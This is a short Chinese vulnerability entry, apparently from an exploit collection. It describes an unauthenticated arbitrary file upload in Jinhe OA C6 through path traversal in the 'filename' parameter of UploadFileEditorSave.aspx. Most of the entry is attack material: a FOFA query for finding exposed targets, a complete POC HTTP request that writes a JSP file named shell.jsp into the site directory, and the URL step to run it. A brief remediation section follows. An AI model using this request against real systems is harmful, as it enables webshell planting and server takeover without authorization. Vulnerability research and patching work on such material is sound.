---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA UploadFileEditorSave 任意文件上传漏洞

# 漏洞描述

金和OA C6 的 `Control/UploadFileEditorSave.aspx` 接口中 `filename` 参数存在目录遍历，結合文件上传可導致任意文件上传漏洞。未授权的远程攻击者可通过 `filename=\\....\\....\\C6\\` 跳出限制目录，将 JSP webshell 写入站点目录，直接获取服务器权限。

影响范围

金和OA C6

# 漏洞复现

FOFA：app="金和网络-金和OA"

POC：

```
POST /C6/Control/UploadFileEditorSave.aspx?filename=\\....\\....\\C6\\ HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="FileBlod"; filename="shell.jsp"
Content-Type: image/png

<% out.println("hello"); %>
------boundary--
```

上传成功后访问 `http://target/c6/shell.jsp` 即可执行。

# 修复方案

对 `filename` 参数做严格校验，禁止目录遍历字符；上传文件做类型白名单校验；联系厂商获取官方补丁并升级。
